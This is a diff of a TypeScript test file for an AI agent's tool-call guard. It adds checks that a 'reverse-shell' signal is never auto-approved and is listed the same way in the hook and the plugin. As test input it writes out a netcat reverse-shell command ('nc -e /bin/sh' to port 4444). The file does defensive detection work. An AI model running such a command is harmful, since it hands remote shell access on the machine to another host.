@@ -486,14 +486,14 @@ describe('#509 R4-1 — the guard self-protection floor is ONE list, duplicated 
   });
 
   it('r5 finding 3: every auto-approval and failure-allow exit consults the floor, in both planes', () => {
-    expect(hookSrc).toMatch(/if \(autoApprove\.length > 0 && !unscannedBlock && !selfProtected\)/);
-    expect(hookSrc).toMatch(/brokered\?\.outcome === 'pre_clear' && !unscannedBlock && !selfProtected/);
+    expect(hookSrc).toMatch(/if \(autoApprove\.length > 0 && !unscannedBlock && !selfProtected && !promptOnly\)/);
+    expect(hookSrc).toMatch(/brokered\?\.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !promptOnly\)/);
     // #999: the plugin's two operator releases also refuse a taint-minted
     // block — it left `unscannedBlock` (it is a scanned verdict) but must not
     // become releasable by the allowlist or a broker pre-clear under enforce.
     // The hook has no taint escalation, so it has no counterpart clause.
-    expect(pluginSrc).toMatch(/if \(autoApprove\.length > 0 && !unscannedBlock && !selfProtected && !taintMintedBlock\)/);
-    expect(pluginSrc).toMatch(/brokered\?\.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !taintMintedBlock\)/);
+    expect(pluginSrc).toMatch(/if \(autoApprove\.length > 0 && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock\)/);
+    expect(pluginSrc).toMatch(/brokered\?\.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock\)/);
     expect(pluginSrc).toMatch(/const deny = failAction === 'deny' \|\| brokerDenies \|\| selfProtected;/);
     expect(pluginSrc).toMatch(/const failAction: FailureAction = selfProtected \? 'deny' : config\.failurePolicy\[severity\];/);
     expect(pluginSrc).toMatch(/config\.failurePolicy\.high === 'allow' && !selfProtectSignal \? 'allow' : 'deny'/);
@@ -504,6 +504,45 @@ describe('#509 R4-1 — the guard self-protection floor is ONE list, duplicated 
       expect({ sig, inHook: hookSrc.includes(`signal: '${sig}'`), inPlugin: pluginSrc.includes(`signal: '${sig}'`) })
         .toEqual({ sig, inHook: true, inPlugin: true });
     }
+  });
+});
+
+describe('#1005 — the prompt-only signals are ONE list, duplicated verbatim (Case, review 5994115085)', () => {
+  function listAfter(src: string, marker: RegExp): string[] {
+    const m = marker.exec(src);
+    expect(m).not.toBeNull();
+    const body = src.slice(m!.index + m![0].length);
+    const close = body.search(/[\])]/);
+    return [...body.slice(0, close).matchAll(/['"]([a-z-]+)['"]/g)].map((x) => x[1]);
+  }
+
+  it('the hook fallback and the OpenClaw plugin carry exactly the exported list', async () => {
+    const { GUARD_PROMPT_ONLY_SIGNALS } = await import('../defence/iron-dome/tool-action-guard.js');
+    const canonical = [...GUARD_PROMPT_ONLY_SIGNALS];
+    expect(canonical).toEqual(['reverse-shell']);
+    expect(listAfter(hookSrc, /const FALLBACK_PROMPT_ONLY_SIGNALS = \[/)).toEqual(canonical);
+    expect(listAfter(pluginSrc, /export const PROMPT_ONLY_SIGNALS: readonly string\[\] = \[/)).toEqual(canonical);
+    // The hook's live path reads the guard's own export.
+    expect(hookSrc).toMatch(/guard\?\.GUARD_PROMPT_ONLY_SIGNALS/);
+  });
+
+  it('every prompt-only signal is a signal the guard actually emits, and none is tap-eligible', async () => {
+    const { GUARD_PROMPT_ONLY_SIGNALS, evaluateToolCall } = await import('../defence/iron-dome/tool-action-guard.js');
+    const { TAP_ELIGIBLE_SIGNALS } = await import('../defence/iron-dome/tap-eligibility.js');
+    expect(evaluateToolCall('Bash', { command: 'nc -e /bin/sh h 4444' }).signals).toEqual(expect.arrayContaining([...GUARD_PROMPT_ONLY_SIGNALS]));
+    for (const s of GUARD_PROMPT_ONLY_SIGNALS) expect({ s, tap: TAP_ELIGIBLE_SIGNALS.includes(s) }).toEqual({ s, tap: false });
+  });
+
+  it('both planes gate the allowlist and the broker pre-clear on it; the plugin also gates the broker timeout approval', () => {
+    expect(hookSrc).toMatch(/const promptOnly = Array\.isArray\(verdict\.signals\) && verdict\.signals\.some\(\(s\) => onlySignals\.includes\(s\)\);/);
+    expect(pluginSrc).toMatch(/const promptOnly = isPromptOnlyVerdict\(v\.signals\);/);
+    expect(pluginSrc).toMatch(/const outcome = selfProtected \|\| promptOnly \? 'deny' : broker!\.timeoutOutcome\(brokered\);/);
+    expect(pluginSrc).toMatch(/const brokerDenies = brokered \? \(promptOnly \|\| broker!\.timeoutOutcome\(brokered\) === 'deny'\) : false;/);
+    // Advisory and shadow are unchanged: prompt-only is not part of those conditions.
+    expect(hookSrc).toMatch(/if \(shadow && !unscannedBlock && !selfProtected\) \{/);
+    expect(hookSrc).toMatch(/if \(!cfg\.enforce && !unscannedBlock && !selfProtected\) \{/);
+    expect(pluginSrc).toMatch(/if \(gate\.shadow && !unscannedBlock && !selfProtected\) \{/);
+    expect(pluginSrc).toMatch(/if \(!actionGuardCfg\.enforce && !unscannedBlock && !selfProtected\) \{/);
   });
 });
 
